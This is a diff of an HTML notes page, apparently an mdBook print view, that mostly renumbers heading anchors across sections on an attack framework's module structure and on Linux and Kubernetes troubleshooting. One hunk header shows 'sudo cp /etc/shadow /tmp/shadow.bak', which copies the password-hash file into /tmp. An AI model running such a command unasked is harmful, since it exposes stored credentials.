-<h2 id="key-takeaways-9"><a class="header" href="#key-takeaways-9">Key Takeaways</a></h2>
+<h2 id="key-takeaways-10"><a class="header" href="#key-takeaways-10">Key Takeaways</a></h2>
 <ol>
 <li><strong>Module Structure</strong>: Understanding the <code>&lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</code> format helps identify appropriate modules</li>
 <li><strong>Search Functionality</strong>: Powerful search with multiple keywords and filters helps find the right module quickly</li>
@@ -47056,7 +47649,7 @@ sudo cp /etc/shadow /tmp/shadow.bak
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-4"><a class="header" href="#troubleshooting-4">Troubleshooting</a></h1>
-<h2 id="directory-map-42"><a class="header" href="#directory-map-42">Directory Map</a></h2>
+<h2 id="directory-map-43"><a class="header" href="#directory-map-43">Directory Map</a></h2>
 <ul>
 <li><a href="troubleshooting/linux">linux</a></li>
 <li><a href="troubleshooting/troubleshooting_playbook">troubleshooting_playbook</a></li>
@@ -47111,7 +47704,7 @@ az aks nodepool update –resource-group rc-02us1-kubernetes-01-rg –cluster-na
 </ol>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-1"><a class="header" href="#linux-1">Linux</a></h1>
-<h2 id="directory-map-43"><a class="header" href="#directory-map-43">Directory Map</a></h2>
+<h2 id="directory-map-44"><a class="header" href="#directory-map-44">Directory Map</a></h2>
 <ul>
 <li><a href="#troubleshooting-memory">memory</a></li>
 </ul>
@@ -47167,7 +47760,7 @@ az aks nodepool update –resource-group rc-02us1-kubernetes-01-rg –cluster-na
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-playbook"><a class="header" href="#troubleshooting-playbook">Troubleshooting Playbook</a></h1>
-<h2 id="directory-map-44"><a class="header" href="#directory-map-44">Directory Map</a></h2>
+<h2 id="directory-map-45"><a class="header" href="#directory-map-45">Directory Map</a></h2>
 <ul>
 <li><a href="#troubleshooting-503s-for-apps-in-kubernetes">kubernetes-containerized-app-503s</a></li>
 <li><a href="#general-troubleshootingnotes">kubernetes-general</a></li>
@@ -47281,7 +47874,7 @@ KubePodInventory
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="what-happens-when"><a class="header" href="#what-happens-when">What Happens When…</a></h1>
-<h2 id="directory-map-45"><a class="header" href="#directory-map-45">Directory Map</a></h2>
+<h2 id="directory-map-46"><a class="header" href="#directory-map-46">Directory Map</a></h2>
 <ul>
 <li><a href="#what-happens-when-a-cpu-starts">a-cpu-starts</a></li>
 </ul>
